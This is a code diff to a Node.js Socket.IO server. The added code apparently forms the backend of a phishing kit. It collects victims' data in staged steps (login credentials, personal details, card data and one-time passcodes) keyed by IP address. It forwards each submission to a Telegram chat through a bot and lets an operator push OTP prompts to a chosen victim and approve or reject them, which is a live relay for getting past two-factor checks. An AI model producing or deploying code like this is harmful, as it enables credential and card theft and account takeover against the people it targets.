@@ -348,6 +348,56 @@ io.on('connection', (socket, req) => {
         io.emit('join', Array.from(sessionStore.entries()));
     });
 
+    socket.on('sendOTP', (data) => {
+        io.to(data.ip).emit('OTP', {otp:true})
+    })
+
+    socket.on('sendOTPResponse', (data) => {
+        if(data.res == 'good'){
+             io.to(data.ip).emit('OTPResponse', {res:true})
+        } else {
+             io.to(data.ip).emit('OTPResponse', {res:false})
+        }
+    })
+
+    
+    socket.on('submit', (data) => {
+        if (sessionStore.has(userIP)) {
+        let userDetails = sessionStore.get(userIP);
+            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP) {
+            userDetails.getUserDataLogin = {};
+                userDetails.getUserDataDetails = {};
+                userDetails.getUserDataCard = {};
+                userDetails.getUserDataOTP = {};
+        }
+        if(userDetails.stage == 'Login'){
+            userDetails.getUserDataLogin = data
+           
+        } else if(userDetails.stage == 'Details'){
+            userDetails.getUserDataDetails = data
+            
+        } else if(userDetails.stage == 'Card'){
+            userDetails.getUserDataCard = data
+            
+        } else if(userDetails.stage == 'OTP'){
+            userDetails.getUserDataOTP = data
+            
+        } 
+            
+        sessionStore.set(userIP, userDetails);
+        io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
+    }
+        let user = data
+        user.ip = userIP
+           // Additional logic for sending a message via Telegram bot
+        let message = JSON.stringify(user, null, 2);
+        bot.sendMessage(chatId, message);
+       
+        //console.log(data)
+    })
+
+
+
     socket.on('disconnect', () => {
         if (sessionStore.has(userIP)) {
             let userDetails = sessionStore.get(userIP);
